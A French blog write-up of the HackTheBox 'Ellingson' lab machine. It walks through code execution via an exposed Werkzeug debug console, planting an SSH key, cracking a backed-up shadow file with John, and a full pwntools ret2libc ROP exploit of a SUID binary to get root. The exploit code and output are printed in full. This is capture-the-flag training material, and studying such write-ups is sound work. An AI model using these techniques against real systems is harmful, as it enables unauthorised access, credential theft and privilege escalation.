---
layout: post
title: HackTheBox - Ellingson 
---

![Writeup]({{ site.baseurl }}/images/ellingson.jpg){:class="img-responsive"}

# Ellingson 

Premiere étape, le scan de port : l

~~~bash
root@kali:~# nmap -sC -sV -oA scan.nmap 10.10.10.139 -p-
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-31 16:30 CEST
Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 67.65% done; ETC: 16:32 (0:00:37 remaining)
Nmap scan report for 10.10.10.139
Host is up (0.015s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.81 seconds
~~~

J'ai lancé un dirsearch pour lister les subfolders sur le port 80 mais je n'ai rien trouvé. 
En observant le site j'ai découvert qu'en tapant ceci `http://10.10.10.139/articles/toto` nous tombions sur un console Werkzeug pour le debug. 

Nous pouvons lancer des commandes : 

~~~python
import subprocess
subprocess.check_output(['id'])
b'uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)\n'
~~~

En faisant un tour dans le dossier personnel de hal nous trouvons un dossier `.ssh` avec une clé chiffré et un fichier `authorized_keys`. 
Nous allons donc generer une clé et la mettre dans ce fichier pour nous permettre de nous y connecter : 

~~~python
subprocess.check_output(['cat','/home/hal/.ssh/authorized_keys'])

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDYwjMf+ObMIYDmHFWQRknEJCwGuaMLHXh0sp9d7nNj9nWBck/mq5L8D9D/df/hp5OkGURLC4SnR4L9Zz7ZzgzBbWt5OKDV8D4exPtgasu1D+do+LEgn+43ExP88nx5SAclbQnm2/X0QBq8KLaQFQku8Zm/Pd1EsX3+f4kF2NaEJqz5xDVJX7PUZ4W2TCAP/tVAXoQ3xRO9bzP5ZpomDk2cuyLhEmKwXtCdgqNWGkbfS3gqoJTrPcT+QABMou1/IxeS1xqDt5hKPF6Z6lnYGvZBkFkC2qkne4v+8yE1jH+dshp2Lnjyhe1fEAfqjuKL0rjiuLypgTkSsXFcL2N6+Q4PtG/jdwKTmCD0NPIrkpSiglngZ2KL8Hymz16XjREPV329IZMMayIy2h3JBqqPb2y6KjISc+XWPJjy7J2bX2Epu8PspWgwCQ7riddNhu+UXQZFSZQ17klZWyHfEgAii68IYTQ0hXIsFyuQev6AUR9OQfZX3rhixMc6nBtWVs9HCaHUk6FEFg3dUr36+qcR6gjj0AHk+CeUC6WpmyslBA975GBen48biPmiFp4C9XnFXUCnRjUDljz+Hl97tJ6lIIRUcA8qCfzrXM8wxApT95RkaMK6a1v8fkweDKeLO4jKg+WYihFBwbRBzTQlUzbPvxPyPSetZch8WsMSo+w7z5UwVQ== root@box-building-vm

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzyoOPqsrztNQtzY2VEKOCYnqEb8Py5Da1fNnOtVr99DZfV/qaliUecQ/EqpItWb8HMaajmRiyQIJaFTvYX6aGexnbrnosFMwRK+4YBkS1UBplQh+wjXWox/owngF/bo0rqWUWy3FrlFTsCoDbiWynuwh/UK6XLRONjGKh9Z3h0mxKnvf0pi7jjBt8AwU7LEFbT0xDmaorM9YTMhyDpImx8d6em6UVS3dyOG02MU8MlaxHjsijyIQOg0qqagBTM6QG5KNsjzBD58HeOELNz9/WIJTzeTRhajzIr3Og4rDydQkgdqE26MRDMNXEviu2ObIUq2kBg/7DYSMFShnUjW4d root@kali-desk-vm

~~~

Ajoutons la notre : 

> Note : Crééons la avec ssh-keygen

~~~python
>>> f=open("/home/hal/.ssh/authorized_keys","a+")
>>> f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WqwOLGc5Pus/MbutVIjV1nrf7CiBGcMvrz2fmOVDZl7+DmOjC1FC/oNhLaiL1YCx0LiY3q8UdvLHq2Dxbs6gRvLS3ZDmbjPwbk9AeN4q4aW96bbMRZS+9MbASzUdJ3Dyyiu0+w52L73E80uxck3nH/DLLyuE/1beu5MReTcHKDNgY5npV3kelzjf4FBrsF9PkCqvZ8Q6ZgFeZd2WkjmC7NJTeObc+u6sap+TIEyH3PnL7UdNrnptaesdQuMjQz/jbLEKc8aeggsvEgc4CD7ZQJy5QxFFeVWF2ujkHTTRfnbbLk/Rq4LatgUONIYRhGbv/2yQuGzrhph/LjqhT35b root@kali")
390
>>> f.close()
>>> subprocess.check_output(['cat','/home/hal/.ssh/authorized_keys'])
b'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WqwOLGc5Pus/MbutVIjV1nrf7CiBGcMvrz2fmOVDZl7+DmOjC1FC/oNhLaiL1YCx0LiY3q8UdvLHq2Dxbs6gRvLS3ZDmbjPwbk9AeN4q4aW96bbMRZS+9MbASzUdJ3Dyyiu0+w52L73E80uxck3nH/DLLyuE/1beu5MReTcHKDNgY5npV3kelzjf4FBrsF9PkCqvZ8Q6ZgFeZd2WkjmC7NJTeObc+u6sap+TIEyH3PnL7UdNrnptaesdQuMjQz/jbLEKc8aeggsvEgc4CD7ZQJy5QxFFeVWF2ujkHTTRfnbbLk/Rq4LatgUONIYRhGbv/2yQuGzrhph/LjqhT35b root@kali'
~~~

Connectons nous : 

~~~bash
root@kali:~# ssh -i .ssh/id_rsa hal@10.10.10.139
Enter passphrase for key '.ssh/id_rsa': 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul 31 15:27:39 UTC 2019

  System load:  0.12               Processes:            101
  Usage of /:   25.4% of 19.56GB   Users logged in:      0
  Memory usage: 18%                IP address for ens33: 10.10.10.139
  Swap usage:   0%

  => There are 3 zombie processes.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul 31 15:27:24 2019 from 10.10.14.65
hal@ellingson:~$ 
~~~

En regardant un peut partout je finis par trouver les fichiers relatifs au site web dans `/var` mais également ceci : 

~~~bash
hal@ellingson:~$ ls /var
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
hal@ellingson:~$ ls -al /var/backups 
total 708
drwxr-xr-x  2 root root     4096 May  7 13:14 .
drwxr-xr-x 14 root root     4096 Mar  9 19:12 ..
-rw-r--r--  1 root root    61440 Mar 10 06:25 alternatives.tar.0
-rw-r--r--  1 root root     8255 Mar  9 22:20 apt.extended_states.0
-rw-r--r--  1 root root      437 Jul 25  2018 dpkg.diversions.0
-rw-r--r--  1 root root      295 Mar  9 22:21 dpkg.statoverride.0
-rw-r--r--  1 root root   615441 Mar  9 22:21 dpkg.status.0
-rw-------  1 root root      811 Mar  9 22:21 group.bak
-rw-------  1 root shadow    678 Mar  9 22:21 gshadow.bak
-rw-------  1 root root     1757 Mar  9 22:21 passwd.bak
-rw-r-----  1 root adm      1309 Mar  9 20:42 shadow.bak
~~~

Je recupére tout cela et je le prépare avec `unshadow` :

> Note: j'ai récupéré le fichier passwd du /etc 

~~~bash
unshadow passwd.bak shadow.bak >tocrack.db 
~~~

Maintenant jel ance John :

~~~bash
root@kali:~/Ellingson# john unshadowed.db  -w=/usr/share/wordlists/rockyou.txt --format=sha512crypt
~~~

> Note : je le laisse tourner toute la nuit

Au final je trouve deux mots de passe : 

~~~bash
root@kali:~/Ellingson# john --show unshadowed.db 
theplague:password123:1000:1000:Eugene Belford:/home/theplague:/bin/bash
margo:iamgod$08:1002:1002:,,,:/home/margo:/bin/bash
~~~

Seul celui de margo semble repondre :

~~~bash
hal@ellingson:~$ su margo
Password: iamgod$08
margo@ellingson:/home/hal$ cd
margo@ellingson:~$ ls
user.txt
margo@ellingson:~$ cat user.txt 
d0ff9e3f9da8bb00aaa6c0bb73e45903
margo@ellingson:~$ 
~~~

En démarrant linenum.sh sur le serveur nous trouvons ceci : 

~~~bash
SC[00;31m[-] SUID files:ESC[00m
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 22520 Jul 13  2018 /usr/bin/pkexec
-rws------ 1 root root 59640 Jan 25  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 18056 Mar  9 21:04 /usr/bin/garbage <====== ICI !!!!
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh
~~~

Bien entendus aucune commande connus ne porte ce doux prénom, voyons donc ce que le programme fais au juste : 

~~~bash
margo@ellingson:~$ /usr/bin/garbage
Enter access password: toto

access denied.
~~~

Nous avons donc les éléments suivants : 

- Executable 
- suid root

En regardant de plus prés l'éxécutable nous trouvons ceci : 

~~~bash
margo@ellingson:~$ file /usr/bin/garbage
/usr/bin/garbage: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped
margo@ellingson:~$ strings /usr/bin/garbage
user: %lu cleared to access this application
user: %lu not authorized to access this application
User is not authorized to access this application. This attempt has been logged.
error
Enter access password: 
N3veRF3@r1iSh3r3!
access granted.
access denied.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit

~~~

Nous avons donc le mot de passe de l'application. Cela ne nous iade en rien car il faut exploiter un BOF (Buffer overflow) 
La premiere étape est de trouver la taille du buffer a exploiter (avec gdb-peda):

![gdb]({{ site.baseurl }}/images/gdb.png){:class="img-responsive"}

L'offset est donc de 136, c'est la taille des données a envoyer pour faire planter le binaire.
Maintenant place au script :

~~~python
from pwn import *

# Préparation de la connexion distante par SSH
shell = ssh('margo' , '10.10.10.139' , password='iamgod$08')

# Ouverture d'un process a traver ssh pour intéragir avec
p=shell.process(["/usr/bin/garbage"])

# déffinition de l'architecture et de l'os
context(os="linux",arch="amd64")
#Récupération des addresses mémoire pour le ROP

# objdump -D garbage | grep puts
#401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
plt_put = p64(0x401050)
got_put = p64(0x404028)

#ROPgadget --binary garbage | grep "pop rdi"
#0x000000000040179b : pop rdi ; ret
pop_rdi = p64(0x40179b)

#objdump -D ./garbage | grep main
#401194:       ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 __libc_start_main@GLIBC_2.2.5
#0000000000401619 <main>:
plt_main = p64(0x401619)

#pattern_create 500 pour generer un pattern dans gdb_peda
#pattern_offset pour trouver l'offset
junk = "A"*136

#Création du payload créant une fuite mémoire
payload = junk + pop_rdi + got_put + plt_put + plt_main

#envoie du payload
p.sendline(payload)
p.recvline()
p.recvline()
#print p.recv()[:8]
leaked = p.recvline(False)[:8].strip().ljust(8,"\x00")

# Même principe qu'avant en récupérant les addresses dans libc.so.6
# Objdump -D pour les addresses mémoires
# strings -t x pour les chaines de caracteres
# ROPgaget pour les instructions ASM

leaked=u64(leaked)
system_libc = 0x04f440
sh_libc = 0x1b3e9a
puts_libc = 0x0809c0
ret = p64(0x401016)
libc_suid = 0x0e5970

offset = leaked - puts_libc
sys = p64(offset + system_libc)
sh = p64(offset + sh_libc)
suid = p64(offset + libc_suid)

payload2 = junk + ret + pop_rdi + p64(0x0) + suid + ret + pop_rdi + sh + sys

p.sendline(payload2)
p.recvline()
p.recvline()
p.interactive()
~~~

> Note : lors du premier lancement, l'exploit n'a pas fonctionné car il faut ajouter un RET. 
> C'est dus au fait que libc utilise des registres SSE créant un décallage. 
> Tester avec et sans si cela plante toujours

Maintenant éxécutons cela : 

~~~bash
root@kali:~/Ellingson/ROP# python exploit.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 12561
[*] Switching to interactive mode
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
# $ cat /root/root.txt
1cc73a448021ea81aee6c029a3d2f997
~~~

## Sources
- Camp CTF 2015 - Bitterman - YouTube
- https://bufferoverflows.net/camp-ctf-2015-bitterman-write-up/
- https://stuffwithaurum.blog/2015/06/22/exploit-development-stack-buffer-overflow/
- https://beta.hackndo.com/return-oriented-programming/
- https://beta.hackndo.com/fonctionnement-de-la-pile/
